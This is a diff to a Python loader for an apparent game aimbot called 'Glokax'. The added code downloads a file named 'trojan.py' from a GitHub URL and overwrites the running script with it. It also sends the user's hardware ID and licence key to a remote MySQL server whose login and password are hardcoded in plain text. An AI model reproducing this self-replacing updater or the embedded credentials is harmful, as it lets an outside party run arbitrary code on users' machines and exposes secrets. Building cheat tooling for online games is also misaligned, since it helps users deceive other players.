@@ -2,32 +2,43 @@ import os
 import json
 import time
 import requests
-from pathlib import Path
 import sys
+import platform
+import mysql.connector
+from pathlib import Path
 
 # Function to retrieve HWID (Windows specific)
 def get_hwid():
-    # Execute the command to get the HWID
-    result = os.popen('wmic csproduct get uuid').read().split('\n')[1].strip()
-    return result
+    if platform.system() == "Windows":
+        # Execute the command to get the HWID
+        result = os.popen('wmic csproduct get uuid').read().split('\n')[1].strip()
+        return result
+    else:
+        return "Unsupported"
 
 # Define the download folder as "Glokax"
 download_folder = os.path.dirname(os.path.abspath(__file__))
 
-# Clear the console window
-os.system("cls")
+# URL of the script on GitHub (or any other hosting platform)
+script_url = "https://github.com/Abood-cpu/glaxzs/blob/main/trojan.py"
 
-print('''
- ________  ___       ________  ___  __    ________     ___    ___ 
-|\   ____\|\  \     |\   __  \|\  \|\  \ |\   __  \   |\  \  /  /|
-\ \  \___|\ \  \    \ \  \|\  \ \  \/  /|\ \  \|\  \  \ \  \/  / /
- \ \  \  __\ \  \    \ \  \\\  \ \   ___  \ \   __  \  \ \    / / 
-  \ \  \|\  \ \  \____\ \  \\\  \ \  \\ \  \ \  \ \  \  /     \/  
-   \ \_______\ \_______\ \_______\ \__\\ \__\ \__\ \__\/  /\   \  
-    \|_______|\|_______|\|_______|\|__| \|__|\|__|\|__/__/ /\ __\ 
-                                                      |__|/ \|__| 
-''')
-print('__________________________________________________________________')
+# Function to check for updates
+def check_for_updates():
+    try:
+        response = requests.get(script_url)
+        latest_script = response.text
+        with open(__file__, 'r') as current_script:
+            current_contents = current_script.read()
+            if current_contents != latest_script:
+                print("Updating script...")
+                with open(__file__, 'w') as updated_script:
+                    updated_script.write(latest_script)
+                print("Script updated successfully.")
+    except Exception as e:
+        print("Error updating script:", e)
+
+# Check for updates before proceeding
+check_for_updates()
 
 # Function to validate the key
 def validate_key(key):
@@ -69,46 +80,46 @@ if validate_key(user_key):
 
         # Create JSON data for config.json
         json_data = {
-        "Glokax": {
-            "Binds": {
-                "Keybind": "RButton",
-                "Pause": "Esc",
-                "Reload": "R"
-            },
-            "Color": {
-                "Saturation": 10
-            },
-            "Bezier": {
-                "LinearCurveX": 0.195,
-                "LinearCurveY": 0.195
-            },
-            "Easing": {
-                "SmoothnessX": 110,
-                "SmoothnessY": 120,
-                "SmoothingReplicatorX": 5,
-                "SmoothingReplicatorY": 5,
-                "SmoothingDividerX": 250,
-                "SmoothingDividerY": 350,
-                "Prediction": {
-                    "Enabled": False,
-                    "Mode": "Ideal",
-                    "PredictionX": 5,
-                    "PredictionY": 8
+            "Glokax": {
+                "Binds": {
+                    "Keybind": "RButton",
+                    "Pause": "Esc",
+                    "Reload": "R"
+                },
+                "Color": {
+                    "Saturation": 10
+                },
+                "Bezier": {
+                    "LinearCurveX": 0.195,
+                    "LinearCurveY": 0.195
+                },
+                "Easing": {
+                    "SmoothnessX": 110,
+                    "SmoothnessY": 120,
+                    "SmoothingReplicatorX": 5,
+                    "SmoothingReplicatorY": 5,
+                    "SmoothingDividerX": 250,
+                    "SmoothingDividerY": 350,
+                    "Prediction": {
+                        "Enabled": False,
+                        "Mode": "Ideal",
+                        "PredictionX": 5,
+                        "PredictionY": 8
+                    }
+                },
+                "Misc": {
+                    "AimbotUpdateTick": 600,
+                    "AimbotUpdateMS": 1000,
+                    "CameraToGunFOV": 85,
+                    "FlickTime": 0,
+                    "KANKAN": False
+                },
+                "FOV": {
+                    "FOVOffsetX": 5,
+                    "FOVOffsetY": 5
                 }
-            },
-            "Misc": {
-                "AimbotUpdateTick": 600,
-                "AimbotUpdateMS": 1000,
-                "CameraToGunFOV": 85,
-                "FlickTime": 0,
-                "KANKAN": False
-            },
-            "FOV": {
-                "FOVOffsetX": 5,
-                "FOVOffsetY": 5
             }
         }
-    }
 
         # Write JSON data to config.json
         with open(json_file_path, 'w') as json_file:
@@ -122,6 +133,24 @@ if validate_key(user_key):
         time.sleep(2)
         print("Glokax - loaded")  # Updated print statement
         time.sleep(2)
+
+        # Store HWID information in MySQL database
+        try:
+            conn = mysql.connector.connect(
+                host="s6inful.mysql.pythonanywhere-services.com",
+                user="s6inful",
+                password="pulhjtjamaaenpht",
+                database="s6inful$glokax"
+            )
+            cursor = conn.cursor()
+            hwid = get_hwid()
+            cursor.execute("INSERT INTO hwid_keys (hwid, key) VALUES (%s, %s)", (hwid, user_key))
+            conn.commit()
+            print("HWID information stored successfully.")
+            cursor.close()
+            conn.close()
+        except Exception as e:
+            print("Error storing HWID information:", e)
 
     except requests.exceptions.RequestException as e:
         print("Error downloading glokax.exe:", e)
